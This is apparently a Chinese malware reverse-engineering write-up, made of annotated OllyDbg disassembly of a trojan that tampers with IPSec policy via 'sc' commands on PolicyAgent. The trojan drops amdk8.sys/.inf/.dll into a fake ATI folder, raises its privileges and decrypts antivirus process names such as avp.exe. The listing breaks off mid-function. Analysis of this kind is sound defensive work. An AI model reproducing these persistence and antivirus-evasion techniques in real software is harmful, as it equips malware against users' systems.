0041E10F    C64424 18 52    mov byte ptr ss:\[esp+18\],52  
0041E114    C64424 1A 67    mov byte ptr ss:\[esp+1A\],67  
0041E119    C64424 1B 4F    mov byte ptr ss:\[esp+1B\],4F  
0041E11E    885424 1C       mov byte ptr ss:\[esp+1C\],dl  
0041E122    C64424 1E 6E    mov byte ptr ss:\[esp+1E\],6E  
0041E127    C64424 1F 4B    mov byte ptr ss:\[esp+1F\],4B  
0041E12C    C64424 21 79    mov byte ptr ss:\[esp+21\],79  
0041E131    C64424 22 45    mov byte ptr ss:\[esp+22\],45  
0041E136    C64424 23 78    mov byte ptr ss:\[esp+23\],78  
0041E13B    C64424 24 41    mov byte ptr ss:\[esp+24\],41  
0041E140    C64424 25 00    mov byte ptr ss:\[esp+25\],0  
0041E145    884C24 08       mov byte ptr ss:\[esp+8\],cl  
0041E149    C64424 0A 76    mov byte ptr ss:\[esp+A\],76  
0041E14E    884C24 0B       mov byte ptr ss:\[esp+B\],cl  
0041E152    885424 0C       mov byte ptr ss:\[esp+C\],dl  
0041E156    C64424 0D 69    mov byte ptr ss:\[esp+D\],69  
0041E15B    C64424 0E 33    mov byte ptr ss:\[esp+E\],33  
0041E160    C64424 0F 32    mov byte ptr ss:\[esp+F\],32  
0041E165    C64424 10 2E    mov byte ptr ss:\[esp+10\],2E  
0041E16A    C64424 14 00    mov byte ptr ss:\[esp+14\],0  
0041E16F    FF15 24104000   call dword ptr ds:\[<&KERNEL32.LoadLibraryA>\]     ; kernel32.LoadLibraryA  
0041E175    8D4C24 14       lea ecx,dword ptr ss:\[esp+14\]                    ; RegOpenKeyExA  
0041E179    8BF0            mov esi,eax                                      ; advapi32 的基址：77da0000  
0041E17B    51              push ecx                                         ; RegOpenKeyExA  
0041E17C    56              push esi                                         ; 基址  
0041E17D    FF15 20104000   call dword ptr ds:\[<&KERNEL32.GetProcAddress>\]   ; GetProcAddress  
0041E183    85C0            test eax,eax  
0041E185    74 2D           je short x1un\_.0041E1B4  
0041E187    8B5424 38       mov edx,dword ptr ss:\[esp+38\]  
0041E18B    8B4C24 34       mov ecx,dword ptr ss:\[esp+34\]  
0041E18F    57              push edi  
0041E190    52              push edx  
0041E191    8B5424 38       mov edx,dword ptr ss:\[esp+38\]  
0041E195    51              push ecx  
0041E196    8B4C24 38       mov ecx,dword ptr ss:\[esp+38\]  
0041E19A    52              push edx  
0041E19B    8B5424 38       mov edx,dword ptr ss:\[esp+38\]  
0041E19F    51              push ecx                                         ; SOFTWARE\\Policies\\Microsoft\\Windows\\IPSec\\Policy\\Local  
0041E1A0    52              push edx  
0041E1A1    FFD0            call eax                                         ; RegOpenKeyExA  
0041E1A3    56              push esi  
0041E1A4    8BF8            mov edi,eax  
0041E1A6    FF15 30104000   call dword ptr ds:\[<&KERNEL32.FreeLibrary>\]      ; kernel32.FreeLibrary  
0041E1AC    8BC7            mov eax,edi  
0041E1AE    5F              pop edi  
0041E1AF    5E              pop esi  
0041E1B0    83C4 20         add esp,20  
0041E1B3    C3              retn  
  
  
}  
  
0041E387    83C4 14         add esp,14  
0041E38A    85C0            test eax,eax  
0041E38C    74 0A           je short x1un\_.0041E398                           跳转未实现  
0041E38E    33C0            xor eax,eax  
0041E390    5B              pop ebx  
0041E391    81C4 3C020000   add esp,23C  
0041E397    C3              retn  
  
  
}  
0041E6D0    68 D0070000     push 7D0  
0041E6D5    E8 66F7FFFF     call x1un\_.0041DE40    这个函数前面分析过      ；同理这个函数加载 Kernel.dll  
0041E6DA    53              push ebx  
0041E6DB    8D8D 70FFFFFF   lea ecx,dword ptr ss:\[ebp-90\]               config PolicyAgent start= auto  
配置 policyagent 为自动启动  
  
0041E6E1    53              push ebx  
0041E6E2    51              push ecx  
0041E6E3    68 B0CE4100     push x1un\_.0041CEB0                              ; ASCII "sc"  
0041E6E8    68 E8CD4100     push x1un\_.0041CDE8                              ; ASCII "open"  
0041E6ED    53              push ebx  
0041E6EE    E8 EDF7FFFF     call x1un\_.0041DEE0                                
  
加载 shell32.dll（基址为 7D590000），并运行函数 shellexecuteA，上面这个 call 的作用是，通过定位 shell32.dll，找到函数 shellexecuteA，  
实现 “ config PolicyAgent start= auto”。。。~~~嘿嘿，下面的代码类似，同样是实现了某些功能，听我细细分析。。  
  
0041E6F3    68 A00F0000     push 0FA0  
0041E6F8    E8 43F7FFFF     call x1un\_.0041DE40  
0041E6FD    53              push ebx                                         7c99e16f  
0041E6FE    8D55 A4         lea edx,dword ptr ss:\[ebp-5C\]                    stop PolicyAgent  
0041E701    53              push ebx   
0041E702    52              push edx  
0041E703    68 B0CE4100     push x1un\_.0041CEB0                              ; ASCII "sc"  
0041E708    68 E8CD4100     push x1un\_.0041CDE8                              ; ASCII "open"  
0041E70D    53              push ebx  
0041E70E    E8 CDF7FFFF     call x1un\_.0041DEE0                               
  
同理，加载 shell32.dll，运行函数 shellexecuteA 实现：stop PolicyAgent  
  
  
0041E713    68 A00F0000     push 0FA0  
0041E718    E8 23F7FFFF     call x1un\_.0041DE40                              加载 kernel32.dll  
0041E71D    53              push ebx  
0041E71E    8D45 90         lea eax,dword ptr ss:\[ebp-70\]                    start PolicyAgent  
0041E721    53              push ebx  
0041E722    50              push eax  
0041E723    68 B0CE4100     push x1un\_.0041CEB0                              ; ASCII "sc"  
0041E728    68 E8CD4100     push x1un\_.0041CDE8                              ; ASCII "open"  
0041E72D    53              push ebx  
0041E72E    E8 ADF7FFFF     call x1un\_.0041DEE0  
  
同理同理，加载 shell32.dll，运行函数 shellexecuteA 实现：start PolicyAgent  
  
  
从 0041EC68--0041E72E 进行总结：首先是创建一个线程，该线程的主要功能是查找瑞星进程，如果没有找到瑞星进程，则通过注册表打开  
IPSec，并执行以下操作：  
  
  
"config PolicyAgent start= auto"  
"stop PolicyAgent"  
"start PolicyAgent"  
  
ok，继续向下分析，好累啊~~~  
  
0041E733    83C4 54         add esp,54  
0041E736    68 401F0000     push 1F40  
0041E73B    E8 00F7FFFF     call x1un\_.0041DE40  
0041E740    83C4 04         add esp,4  
0041E743    60              pushad  
0041E744    03C9            add ecx,ecx  
0041E746    2D 88000000     sub eax,88  
0041E74B    03C0            add eax,eax  
0041E74D    61              popad  
0041E74E    B9 3F000000     mov ecx,3F  
0041E753    33C0            xor eax,eax  
0041E755    8DBD 70FEFFFF   lea edi,dword ptr ss:\[ebp-190\]  
0041E75B    F3:AB           rep stos dword ptr es:\[edi\]  
0041E75D    66:AB           stos word ptr es:\[edi\]  
0041E75F    AA              stos byte ptr es:\[edi\]  
0041E760    B9 3F000000     mov ecx,3F  
0041E765    33C0            xor eax,eax  
0041E767    8DBD 70FAFFFF   lea edi,dword ptr ss:\[ebp-590\]  
0041E76D    F3:AB           rep stos dword ptr es:\[edi\]  
0041E76F    66:AB           stos word ptr es:\[edi\]  
0041E771    AA              stos byte ptr es:\[edi\]  
0041E772    B9 3F000000     mov ecx,3F  
0041E777    33C0            xor eax,eax  
0041E779    8DBD 70FDFFFF   lea edi,dword ptr ss:\[ebp-290\]  
0041E77F    F3:AB           rep stos dword ptr es:\[edi\]  
0041E781    66:AB           stos word ptr es:\[edi\]  
0041E783    AA              stos byte ptr es:\[edi\]  
0041E784    90              nop  
0041E785    90              nop  
0041E786    03D3            add edx,ebx  
0041E788    90              nop  
0041E789    90              nop  
0041E78A    03D3            add edx,ebx  
0041E78C    90              nop  
0041E78D    F7D3            not ebx  
0041E78F    90              nop  
0041E790    90              nop  
0041E791    90              nop  
0041E792    43              inc ebx  
0041E793    90              nop  
0041E794    90              nop  
0041E795    03D3            add edx,ebx  
0041E797    90              nop  
0041E798    90              nop  
0041E799    F7DB            neg ebx  
0041E79B    90              nop  
0041E79C    90              nop  
0041E79D    8D8D 70FEFFFF   lea ecx,dword ptr ss:\[ebp-190\]  
0041E7A3    68 FF000000     push 0FF                                           buffer  0012FA00  
0041E7A8    51              push ecx                                           bufsize  FF  
0041E7A9    FF15 50104000   call dword ptr ds:\[<&KERNEL32.GetSystemDirectory>; kernel32.GetSystemDirectoryA 获取系统目录  
0041E7AF    8D95 70FEFFFF   lea edx,dword ptr ss:\[ebp-190\]                     C:\\WINDOWS\\system32  
  
0041E7B5    6A 03           push 3  
0041E7B7    8D85 70FAFFFF   lea eax,dword ptr ss:\[ebp-590\]                     0012F600  
0041E7BD    52              push edx                                           C:\\WINDOWS\\system32  
0041E7BE    50              push eax                                           0012F600  
0041E7BF    E8 3C0B0000     call x1un\_.0041F300                                判断路径是否存在  
0041E7C4    8B3D 4C104000   mov edi,dword ptr ds:\[<&KERNEL32.lstrcpy>\]       ; kernel32.lstrcpyA  
0041E7CA    83C4 0C         add esp,0C  
0041E7CD    8D8D 70FAFFFF   lea ecx,dword ptr ss:\[ebp-590\]  
0041E7D3    8D95 70FEFFFF   lea edx,dword ptr ss:\[ebp-190\]                     C:\\WINDOWS\\system32  
0041E7D9    51              push ecx  
0041E7DA    52              push edx  
0041E7DB    FFD7            call edi  
0041E7DD    8B35 48104000   mov esi,dword ptr ds:\[<&KERNEL32.lstrcat>\]       ; kernel32.lstrcatA  
0041E7E3    8D45 B8         lea eax,dword ptr ss:\[ebp-48\]                      progra~1\\ATI  
  
0041E7E6    8D8D 70FEFFFF   lea ecx,dword ptr ss:\[ebp-190\]                     12FA00  
0041E7EC    50              push eax  
0041E7ED    51              push ecx  
0041E7EE    FFD6            call esi                                            lstrcatA，连接形成路径 C:\\program\\ATI  
0041E7F0    90              nop  
0041E7F1    90              nop  
0041E7F2    90              nop  
0041E7F3    03C1            add eax,ecx  
0041E7F5    90              nop  
0041E7F6    90              nop  
0041E7F7    03C1            add eax,ecx  
0041E7F9    90              nop  
0041E7FA    F7D1            not ecx  
0041E7FC    90              nop  
0041E7FD    90              nop  
0041E7FE    90              nop  
0041E7FF    41              inc ecx  
0041E800    90              nop  
0041E801    90              nop  
0041E802    03C1            add eax,ecx  
0041E804    90              nop  
0041E805    90              nop  
0041E806    F7D9            neg ecx  
0041E808    90              nop  
0041E809    90              nop  
0041E80A    8D95 70FEFFFF   lea edx,dword ptr ss:\[ebp-190\]  
0041E810    6A 00           push 0  
0041E812    52              push edx  
0041E813    E8 88F4FFFF     call x1un\_.0041DCA0                                    又要开始加载 DLL 了 kernel32.dll  
  
我简单分析下这个函数，跟前面一样，加载 kernel32.dll，实现函数 CreateDirectoryA, 创建路径：C:\\programfiles\\ATI  
  
0041E818    83C4 08         add esp,8  
0041E81B    8D85 70FEFFFF   lea eax,dword ptr ss:\[ebp-190\]  
0041E821    68 ACCE4100     push x1un\_.0041CEAC  
0041E826    50              push eax  
0041E827    FFD6            call esi  
0041E829    90              nop  
0041E82A    90              nop  
0041E82B    03C8            add ecx,eax  
0041E82D    90              nop  
0041E82E    90              nop  
0041E82F    03C8            add ecx,eax  
0041E831    90              nop  
0041E832    F7D0            not eax  
0041E834    90              nop  
0041E835    90              nop  
0041E836    90              nop  
0041E837    40              inc eax  
0041E838    90              nop  
0041E839    90              nop  
0041E83A    03C8            add ecx,eax  
0041E83C    90              nop  
0041E83D    90              nop  
0041E83E    F7D8            neg eax  
0041E840    90              nop  
0041E841    90              nop  
0041E842    8D8D 70FEFFFF   lea ecx,dword ptr ss:\[ebp-190\]            开始在 C:\\program\\ATI 路径下生成文件了  
0041E848    8D95 70FDFFFF   lea edx,dword ptr ss:\[ebp-290\]  
0041E84E    51              push ecx  
0041E84F    52              push edx  
0041E850    FFD7            call edi  
0041E852    90              nop  
0041E853    8D45 EC         lea eax,dword ptr ss:\[ebp-14\]              amdk8.inf  
0041E856    8D8D 70FDFFFF   lea ecx,dword ptr ss:\[ebp-290\]  
0041E85C    50              push eax  
0041E85D    51              push ecx  
0041E85E    FFD6            call esi                                    lstrcatA  
0041E860    90              nop  
0041E861    8D95 70FEFFFF   lea edx,dword ptr ss:\[ebp-190\]  
0041E867    8D85 70FCFFFF   lea eax,dword ptr ss:\[ebp-390\]              C:\\program\\ATI\\amdk8.inf  
0041E86D    52              push edx  
0041E86E    50              push eax  
0041E86F    FFD7            call edi  
0041E871    90              nop  
0041E872    8D4D E0         lea ecx,dword ptr ss:\[ebp-20\]             amdk8.sys 驱动啊驱动  
0041E875    8D95 70FCFFFF   lea edx,dword ptr ss:\[ebp-390\]              C:\\program\\ATI  
0041E87B    51              push ecx                                     两个参数  
0041E87C    52              push edx  
0041E87D    FFD6            call esi                                    lstrcatA  
0041E87F    90              nop  
0041E880    8D85 70FEFFFF   lea eax,dword ptr ss:\[ebp-190\]  
0041E886    8D8D 70FBFFFF   lea ecx,dword ptr ss:\[ebp-490\]             C:\\program\\ATI\\amdk8.sys  
0041E88C    50              push eax  
0041E88D    51              push ecx  
0041E88E    FFD7            call edi  
0041E890    90              nop  
0041E891    8D55 D4         lea edx,dword ptr ss:\[ebp-2C\]              amdk8.dll  
0041E894    8D85 70FBFFFF   lea eax,dword ptr ss:\[ebp-490\]  
0041E89A    52              push edx  
0041E89B    50              push eax  
0041E89C    FFD6            call esi                                     同理啦，和上面的一样 lstrcatA  
  
对上面的进行一下总结，就是生成 c:\\program files\\ATI,并在里面生成三个文件 amdk8.sys，amdk8.inf，amdk8.dll  
  
  
0041E89E    90              nop  
0041E89F    90              nop  
0041E8A0    90              nop  
0041E8A1    03C8            add ecx,eax  
0041E8A3    90              nop  
0041E8A4    90              nop  
0041E8A5    03C8            add ecx,eax  
0041E8A7    90              nop  
0041E8A8    F7D0            not eax  
0041E8AA    90              nop  
0041E8AB    90              nop  
0041E8AC    90              nop  
0041E8AD    40              inc eax  
0041E8AE    90              nop  
0041E8AF    90              nop  
0041E8B0    03C8            add ecx,eax  
0041E8B2    90              nop  
0041E8B3    90              nop  
0041E8B4    F7D8            neg eax  
0041E8B6    90              nop  
0041E8B7    90              nop  
0041E8B8    8D8D 70FDFFFF   lea ecx,dword ptr ss:\[ebp-290\]                     C:\\program\\ATI\\amdk8.inf  
0041E8BE    51              push ecx  
0041E8BF    E8 3CE9FFFF     call x1un\_.0041D200                                 此函数的作用，创建文件并写入文件  
{  
0041D200    51              push ecx  
0041D201    53              push ebx  
0041D202    56              push esi  
0041D203    32DB            xor bl,bl  
0041D205    E8 C6FFFFFF     call x1un\_.0041D1D0  
0041D20A    8B4424 10       mov eax,dword ptr ss:\[esp+10\]  
0041D20E    6A 00           push 0  
0041D210    6A 00           push 0  
0041D212    6A 02           push 2  
0041D214    6A 00           push 0  
0041D216    6A 01           push 1  
0041D218    68 00000040     push 40000000  
0041D21D    50              push eax  
0041D21E    FF15 70104000   call dword ptr ds:\[<&KERNEL32.CreateFileA>\]         ; kernel32.CreateFileA  
0041D224    8BF0            mov esi,eax  
0041D226    83FE FF         cmp esi,-1  
0041D229    75 00           jnz short x1un\_.0041D22B  
0041D22B    8B15 BC354100   mov edx,dword ptr ds:\[4135BC\]  
0041D231    8D4C24 08       lea ecx,dword ptr ss:\[esp+8\]  
0041D235    6A 00           push 0  
0041D237    51              push ecx  
0041D238    52              push edx  
0041D239    68 C0354100     push x1un\_.004135C0                                 ; ASCII ";  
; File Name: amdk8.inf  
; Install information file for amdk8 Driver  
;  
; Generated by C DriverWizard 3.2.0 (Build 2485)  
; Requires DDK Only  
; File created on 6/23/2010  
;  
  
;--------- Version Section ------------------------------"...  
0041D23E    56              push esi  
0041D23F    FF15 74104000   call dword ptr ds:\[<&KERNEL32.WriteFile>\]           ; kernel32.WriteFile  
0041D245    85C0            test eax,eax  
0041D247    74 02           je short x1un\_.0041D24B  
0041D249    B3 01           mov bl,1  
0041D24B    56              push esi  
0041D24C    FF15 7C104000   call dword ptr ds:\[<&KERNEL32.CloseHandle>\]         ; kernel32.CloseHandle  
0041D252    8AC3            mov al,bl  
0041D254    5E              pop esi  
0041D255    5B              pop ebx  
0041D256    59              pop ecx  
0041D257    C3              retn  
  
  
}  
0041E8C4    83C4 04         add esp,4  
0041E8C7    84C0            test al,al  
0041E8C9    0F84 36010000   je x1un\_.0041EA05  
0041E8CF    8D95 70FCFFFF   lea edx,dword ptr ss:\[ebp-390\]  
0041E8D5    52              push edx  
0041E8D6    E8 B5E9FFFF     call x1un\_.0041D290                                同理创建驱动 amdk8.sys 并向里面写入数据，不展开了  
0041E8DB    83C4 04         add esp,4  
0041E8DE    84C0            test al,al  
0041E8E0    0F84 1F010000   je x1un\_.0041EA05  
  
对生成的三个文件进行创建和写入操作  
  
在 c:\\program files\\ATI 里面生成三个文件 amdk8.sys，amdk8.inf，amdk8.dll  
  
我们到 ATI 目录下面，找到 amdk8.dll，用 OD 载入之，分析这个 dll 具体实现了什么功能，分析这个病毒真是累啊~~  
  
载入后，Ctrl+N,看输入表，其中发现了 testall（这个就是该 dll 里面的主要函数实现了），木马一般没什么加密，双击之，来到了：  
  
其实在这之前这个 dll 文件还获得了系统最高权限，通过 LookupPrivilegeValueA 和 AdjustTokenPrivileges 函数，就在 dll 的入口处，当然还设置了 debug 权限  
  
10002920 >/$  55            push ebp  
10002921  |.  8BEC          mov ebp,esp  
10002923  |.  8B45 08       mov eax,\[arg.1\]  
10002926  |.  53            push ebx  
10002927  |.  56            push esi  
10002928  |.  57            push edi  
10002929  |.  85C0          test eax,eax  
1000292B  |.  74 11         je short amdk8.1000293E       这里先判断了一下，在 ATI 路径下的 amdk8.dll 是否存在  
1000292D  |.  60            pushad  
1000292E  |.  90            nop  
1000292F  |.  2BC2          sub eax,edx  
10002931  |.  61            popad  
10002932  |.  8B45 08       mov eax,\[arg.1\]  
10002935  |.  50            push eax  
10002936  |.  E8 45FEFFFF   call amdk8.10002780            关键函数，call 进去  
1000293B  |.  83C4 04       add esp,4  
1000293E  |>  5F            pop edi  
1000293F  |.  5E            pop esi  
10002940  |.  5B            pop ebx  
10002941  |.  5D            pop ebp  
  
  
在 10002936 这里的 call 进去，代码如下：  
  
  
10002780  /$  55            push ebp                              分配一个栈  
10002781  |.  8BEC          mov ebp,esp  
10002783  |.  83EC 30       sub esp,30  
10002786  |.  B0 6F         mov al,6F  
10002788  |.  53            push ebx  
10002789  |.  8845 D2       mov byte ptr ss:\[ebp-2E\],al  
1000278C  |.  8845 D6       mov byte ptr ss:\[ebp-2A\],al  
1000278F  |.  B0 6C         mov al,6C  
10002791  |.  56            push esi  
10002792  |.  8845 D7       mov byte ptr ss:\[ebp-29\],al  
10002795  |.  8845 E7       mov byte ptr ss:\[ebp-19\],al  
10002798  |.  8845 E8       mov byte ptr ss:\[ebp-18\],al  
1000279B  |.  8845 F7       mov byte ptr ss:\[ebp-9\],al  
1000279E  |.  8845 F8       mov byte ptr ss:\[ebp-8\],al  
100027A1  |.  8845 FD       mov byte ptr ss:\[ebp-3\],al  
100027A4  |.  8845 FE       mov byte ptr ss:\[ebp-2\],al  
100027A7  |.  8D45 F4       lea eax,\[local.3\]  
100027AA  |.  57            push edi  
100027AB  |.  B3 74         mov bl,74  
100027AD  |.  B1 65         mov cl,65  
100027AF  |.  32D2          xor dl,dl                                初始化堆栈：  
100027B1  |.  50            push eax                                 ; /FileName  
100027B2  |.  C645 D0 73    mov byte ptr ss:\[ebp-30\],73              ; |  
100027B6  |.  885D D1       mov byte ptr ss:\[ebp-2F\],bl              ; |  
100027B9  |.  C645 D3 70    mov byte ptr ss:\[ebp-2D\],70              ; |  
100027BD  |.  C645 D4 20    mov byte ptr ss:\[ebp-2C\],20              ; |  
100027C1  |.  C645 D5 50    mov byte ptr ss:\[ebp-2B\],50              ; |  
100027C5  |.  C645 D8 69    mov byte ptr ss:\[ebp-28\],69              ; |  
100027C9  |.  C645 D9 63    mov byte ptr ss:\[ebp-27\],63              ; |  
100027CD  |.  C645 DA 79    mov byte ptr ss:\[ebp-26\],79              ; |  
100027D1  |.  C645 DB 41    mov byte ptr ss:\[ebp-25\],41              ; |  
100027D5  |.  C645 DC 67    mov byte ptr ss:\[ebp-24\],67              ; |  
100027D9  |.  884D DD       mov byte ptr ss:\[ebp-23\],cl              ; |  
100027DC  |.  C645 DE 6E    mov byte ptr ss:\[ebp-22\],6E              ; |  
100027E0  |.  885D DF       mov byte ptr ss:\[ebp-21\],bl              ; |  
100027E3  |.  8855 E0       mov byte ptr ss:\[ebp-20\],dl              ; |  
100027E6  |.  C645 E4 53    mov byte ptr ss:\[ebp-1C\],53              ; |  
100027EA  |.  C645 E5 68    mov byte ptr ss:\[ebp-1B\],68              ; |  
100027EE  |.  884D E6       mov byte ptr ss:\[ebp-1A\],cl              ; |  
100027F1  |.  C645 E9 45    mov byte ptr ss:\[ebp-17\],45              ; |  
100027F5  |.  C645 EA 78    mov byte ptr ss:\[ebp-16\],78              ; |  
100027F9  |.  884D EB       mov byte ptr ss:\[ebp-15\],cl              ; |  
100027FC  |.  C645 EC 63    mov byte ptr ss:\[ebp-14\],63              ; |  
10002800  |.  C645 ED 75    mov byte ptr ss:\[ebp-13\],75              ; |  
10002804  |.  885D EE       mov byte ptr ss:\[ebp-12\],bl              ; |  
10002807  |.  884D EF       mov byte ptr ss:\[ebp-11\],cl              ; |  
1000280A  |.  C645 F0 41    mov byte ptr ss:\[ebp-10\],41              ; |  
1000280E  |.  8855 F1       mov byte ptr ss:\[ebp-F\],dl               ; |  
10002811  |.  C645 F4 73    mov byte ptr ss:\[ebp-C\],73               ; |  
10002815  |.  C645 F5 68    mov byte ptr ss:\[ebp-B\],68               ; |  
10002819  |.  884D F6       mov byte ptr ss:\[ebp-A\],cl               ; |  
1000281C  |.  C645 F9 33    mov byte ptr ss:\[ebp-7\],33               ; |  
10002820  |.  C645 FA 32    mov byte ptr ss:\[ebp-6\],32               ; |  
10002824  |.  C645 FB 2E    mov byte ptr ss:\[ebp-5\],2E               ; |  
10002828  |.  C645 FC 64    mov byte ptr ss:\[ebp-4\],64               ; |  
1000282C  |.  8855 FF       mov byte ptr ss:\[ebp-1\],dl               ; |  
1000282F  |.  FF15 10100010 call dword ptr ds:\[<&KERNEL32.LoadLibrar>; \\LoadLibraryA  
10002835  |.  90            nop  
10002836  |.  8D4D E4       lea ecx,\[local.7\]                        ShellExecuteA  
10002839  |.  51            push ecx                                 ; /ProcNameOrOrdinal = ShellExecuteA  
1000283A  |.  50            push eax                                 ; |hModule = 7D590000  
1000283B  |.  FF15 0C100010 call dword ptr ds:\[<&KERNEL32.GetProcAdd>; \\GetProcAddress  
10002841  |.  A3 202E0010   mov dword ptr ds:\[10002E20\],eax  
10002846  |.  85C8          test eax,ecx  
10002848  |.  90            nop  
10002849  |.  90            nop  
1000284A  |.  53            push ebx  
1000284B  |.  90            nop  
1000284C  |.  90            nop  
1000284D  |.  74 0A         je short amdk8.10002859  
1000284F  |.  C1E1 01       shl ecx,1  
10002852  |.  8BD9          mov ebx,ecx  
10002854  |.  C1EB 01       shr ebx,1  
10002857  |.  87D9          xchg ecx,ebx  
10002859  |>  5B            pop ebx  
1000285A  |.  90            nop  
1000285B  |.  60            pushad  
1000285C  |.  90            nop  
1000285D  |.  33C2          xor eax,edx  
1000285F  |.  90            nop  
10002860  |.  61            popad  
10002861  |.  90            nop  
10002862  |.  8B55 08       mov edx,\[arg.1\]  
10002865  |.  52            push edx  
10002866  |.  E8 F5F0FFFF   call amdk8.10001960                       这个函数是获取系统的相关信息，节省空间，不展开了，有些累了  
1000286B  |.  83C4 04       add esp,4  
1000286E  |.  85C1          test ecx,eax  
10002870  |.  90            nop  
10002871  |.  90            nop  
10002872  |.  52            push edx  
10002873  |.  90            nop  
10002874  |.  90            nop  
10002875  |.  74 0A         je short amdk8.10002881  
10002877  |.  C1E0 01       shl eax,1  
1000287A  |.  8BD0          mov edx,eax  
1000287C  |.  C1EA 01       shr edx,1  
1000287F  |.  87D0          xchg eax,edx  
10002881  |>  5A            pop edx  
10002882  |.  90            nop  
10002883  |.  60            pushad  
10002884  |.  90            nop  
10002885  |.  33C2          xor eax,edx  
10002887  |.  90            nop  
10002888  |.  61            popad  
10002889  |.  E8 E2FBFFFF   call amdk8.10002470                      ;  关键 call，查找杀软进程  
  
{  
10002470  /$  55            push ebp  
10002471  |.  8BEC          mov ebp,esp  
10002473  |.  81EC 50030000 sub esp,350  
10002479  |.  B0 73         mov al,73  
1000247B  |.  53            push ebx  
1000247C  |.  8845 FC       mov byte ptr ss:\[ebp-4\],al  
1000247F  |.  8845 EE       mov byte ptr ss:\[ebp-12\],al  
10002482  |.  B0 6B         mov al,6B  
10002484  |.  B3 78         mov bl,78  
10002486  |.  8845 EF       mov byte ptr ss:\[ebp-11\],al  
10002489  |.  8845 F0       mov byte ptr ss:\[ebp-10\],al  
1000248C  |.  B0 6C         mov al,6C  
1000248E  |.  B2 2F         mov dl,2F  
10002490  |.  8845 F2       mov byte ptr ss:\[ebp-E\],al  
10002493  |.  8845 F3       mov byte ptr ss:\[ebp-D\],al  
10002496  |.  B0 65         mov al,65  
10002498  |.  B1 20         mov cl,20  
1000249A  |.  56            push esi  
1000249B  |.  57            push edi  
1000249C  |.  C645 FD 63    mov byte ptr ss:\[ebp-3\],63  
100024A0  |.  C645 FE 00    mov byte ptr ss:\[ebp-2\],0  
100024A4  |.  C645 EC 74    mov byte ptr ss:\[ebp-14\],74  
100024A8  |.  C645 ED 61    mov byte ptr ss:\[ebp-13\],61  
100024AC  |.  C645 F1 69    mov byte ptr ss:\[ebp-F\],69  
100024B0  |.  C645 F4 2E    mov byte ptr ss:\[ebp-C\],2E  
100024B4  |.  8845 F5       mov byte ptr ss:\[ebp-B\],al  
100024B7  |.  885D F6       mov byte ptr ss:\[ebp-A\],bl  
100024BA  |.  8845 F7       mov byte ptr ss:\[ebp-9\],al  
100024BD  |.  C645 F8 00    mov byte ptr ss:\[ebp-8\],0  
100024C1  |.  8855 D8       mov byte ptr ss:\[ebp-28\],dl  
100024C4  |.  C645 D9 66    mov byte ptr ss:\[ebp-27\],66  
100024C8  |.  884D DA       mov byte ptr ss:\[ebp-26\],cl  
100024CB  |.  8855 DB       mov byte ptr ss:\[ebp-25\],dl  
100024CE  |.  C645 DC 74    mov byte ptr ss:\[ebp-24\],74  
100024D2  |.  884D DD       mov byte ptr ss:\[ebp-23\],cl  
100024D5  |.  8855 DE       mov byte ptr ss:\[ebp-22\],dl  
100024D8  |.  C645 DF 69    mov byte ptr ss:\[ebp-21\],69  
100024DC  |.  C645 E0 6D    mov byte ptr ss:\[ebp-20\],6D  
100024E0  |.  884D E1       mov byte ptr ss:\[ebp-1F\],cl  
100024E3  |.  C645 E2 61    mov byte ptr ss:\[ebp-1E\],61  
100024E7  |.  C645 E3 76    mov byte ptr ss:\[ebp-1D\],76  
100024EB  |.  C645 E4 70    mov byte ptr ss:\[ebp-1C\],70  
100024EF  |.  C645 E5 2E    mov byte ptr ss:\[ebp-1B\],2E  
100024F3  |.  8845 E6       mov byte ptr ss:\[ebp-1A\],al  
100024F6  |.  885D E7       mov byte ptr ss:\[ebp-19\],bl  
100024F9  |.  8845 E8       mov byte ptr ss:\[ebp-18\],al  
100024FC  |.  C645 E9 00    mov byte ptr ss:\[ebp-17\],0  
10002500  |.  90            nop  
10002501  |.  68 4FD1C15B   push 5BC1D14F  
10002506  |.  6A 01         push 1  
10002508  |.  E8 83040000   call amdk8.10002990  
1000250D  |.  6A 00         push 0  
1000250F  |.  6A 02         push 2  
10002511  |.  FFD0          call eax                               CreateToolhelp32Snapshot 创建进程快照  
10002513  |.  8BD8          mov ebx,eax  
10002515  |.  B9 3F000000   mov ecx,3F  
1000251A  |.  33C0          xor eax,eax  
1000251C  |.  8DBD B0FDFFFF lea edi,\[local.148\]  
10002522  |.  F3:AB         rep stos dword ptr es:\[edi\]  
10002524  |.  66:AB         stos word ptr es:\[edi\]  
10002526  |.  AA            stos byte ptr es:\[edi\]  
10002527  |.  B9 3F000000   mov ecx,3F  
1000252C  |.  33C0          xor eax,eax  
1000252E  |.  8DBD B0FCFFFF lea edi,\[local.212\]  
10002534  |.  C785 B0FEFFFF>mov \[local.84\],128  
1000253E  |.  F3:AB         rep stos dword ptr es:\[edi\]  
10002540  |.  66:AB         stos word ptr es:\[edi\]  
10002542  |.  AA            stos byte ptr es:\[edi\]  
10002543  |.  8D85 B0FEFFFF lea eax,\[local.84\]  
10002549  |.  50            push eax                                 ; /lppe  
1000254A  |.  53            push ebx                                 ; |hSnapshot  
1000254B  |.  E8 C6060000   call <jmp.&KERNEL32.Process32First>      ; \\Process32First  
10002550  |.  85C0          test eax,eax  
10002552  |.  0F84 4C010000 je amdk8.100026A4  
10002558  |.  8B3D 30100010 mov edi,dword ptr ds:\[<&KERNEL32.lstrcmp>;  kernel32.lstrcmpiA  
1000255E  |.  8B35 04100010 mov esi,dword ptr ds:\[<&KERNEL32.lstrcpy>;  kernel32.lstrcpyA  
10002564  |>  68 4C100010   /push amdk8.1000104C                     ;  dys1h{h  
10002569  |.  E8 F2F0FFFF   |call amdk8.10001660  
  
这个函数解密字符串，获得 avp.exe 字符串  
{  
10001660  /$  8B4424 04     mov eax,dword ptr ss:\[esp+4\]  
10001664  |.  56            push esi  
10001665  |.  57            push edi  
10001666  |.  50            push eax                                 ; /String2  
10001667  |.  68 282E0010   push amdk8.10002E28                      ; |String1 = amdk8.10002E28  
1000166C  |.  FF15 04100010 call dword ptr ds:\[<&KERNEL32.lstrcpyA>\] ; \\lstrcpyA  
10001672  |.  8B3D 00100010 mov edi,dword ptr ds:\[<&KERNEL32.lstrlen>;  kernel32.lstrlenA  
10001678  |.  68 282E0010   push amdk8.10002E28                      ; /String = "avp.exh"  
1000167D  |.  33F6          xor esi,esi                              ; |  
1000167F  |.  FFD7          call edi                                 ; \\lstrlenA  
10001681  |.  85C0          test eax,eax  
10001683  |.  7E 1B         jle short amdk8.100016A0  
10001685  |>  8A8E 282E0010 /mov cl,byte ptr ds:\[esi+10002E28\]  
